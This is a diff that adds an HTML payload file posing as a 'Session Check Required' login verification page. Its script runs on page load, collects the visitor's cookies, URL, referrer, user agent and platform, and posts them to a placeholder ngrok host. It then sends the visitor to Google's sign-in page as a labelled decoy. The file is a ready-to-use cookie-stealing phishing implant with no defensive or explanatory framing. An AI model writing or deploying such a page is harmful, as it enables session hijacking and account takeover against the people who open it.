@@ -1,0 +1,46 @@
+<!-- payloads/hijax_remote_implant.html -->
+<html>
+  <head>
+    <title>Session Check Required</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+      body {
+        background: #f4f4f4;
+        font-family: Arial, sans-serif;
+        color: #222;
+        text-align: center;
+        padding: 50px;
+      }
+    </style>
+  </head>
+  <body>
+    <h2>Checking your secure session...</h2>
+    <p>Please wait while we verify your login.</p>
+
+    <script>
+      (async () => {
+        const data = {
+          cookies: document.cookie,
+          url: window.location.href,
+          userAgent: navigator.userAgent,
+          referrer: document.referrer,
+          platform: navigator.platform,
+          timestamp: new Date().toISOString()
+        };
+
+        await fetch("https://YOUR_NGROK_ID.ngrok.io/log", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(data)
+        });
+
+        // Optional delay before redirect
+        setTimeout(() => {
+          window.location.href = "https://accounts.google.com"; // decoy
+        }, 2000);
+      })();
+    </script>
+  </body>
+</html>
